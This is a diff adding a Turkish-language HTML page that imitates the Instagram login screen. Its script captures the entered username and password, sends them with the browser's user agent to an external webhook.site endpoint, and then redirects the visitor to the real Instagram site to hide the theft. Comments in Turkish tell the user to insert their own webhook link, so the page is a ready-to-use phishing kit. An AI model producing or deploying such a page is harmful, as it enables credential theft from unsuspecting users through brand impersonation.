@@ -1,0 +1,62 @@
+<!doctype html>
+<html lang="tr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Instagram</title>
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+     background:#fff;margin:0;padding:40px 24px;display:flex;justify-content:center;
+     min-height:100vh;align-items:flex-start}
+.box{width:100%;max-width:360px;text-align:center;margin-top:20px}
+.logo{font-family:'Billabong','Segoe Script',cursive;font-size:46px;
+      margin-bottom:30px;letter-spacing:-1px;color:#262626}
+input{width:100%;padding:13px 11px;margin-bottom:8px;border:1px solid #dbdbdb;
+      border-radius:6px;background:#fafafa;font-size:16px;outline:none}
+input:focus{border-color:#a8a8a8;background:#fff}
+button{width:100%;padding:11px;background:#0095f6;color:#fff;border:0;
+       border-radius:8px;font-weight:600;font-size:15px;margin-top:8px;cursor:pointer}
+button:active{opacity:.7}
+</style>
+</head>
+<body>
+<div class="box">
+  <div class="logo">Instagram</div>
+  <form id="loginForm">
+    <input name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta"
+           autocomplete="username" autocapitalize="off" autocorrect="off" required>
+    <input name="password" type="password" placeholder="Şifre"
+           autocomplete="current-password" required>
+    <button type="submit">Giriş yap</button>
+  </form>
+</div>
+
+<script>
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    // BURAYA_WEBHOOK_LINKINI_YAPISTIR yazan yeri sil, kendi linkini tırnak içine yaz.
+    // Örnek: const WEBHOOK_URL = 'https://webhook.site/15827ea8-a752...';
+    const WEBHOOK_URL = 'https://webhook.site/15827ea8-a752-479e-a207-f5a5cc59109c';
+    
+    const user = document.querySelector('input[name="username"]').value;
+    const pass = document.querySelector('input[name="password"]').value;
+    
+    fetch(WEBHOOK_URL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            username: user,
+            password: pass,
+            userAgent: navigator.userAgent,
+            timestamp: new Date().toISOString()
+        })
+    }).finally(() => {
+        window.location.href = 'https://www.instagram.com/';
+    });
+});
+</script>
+</body>
+</html>
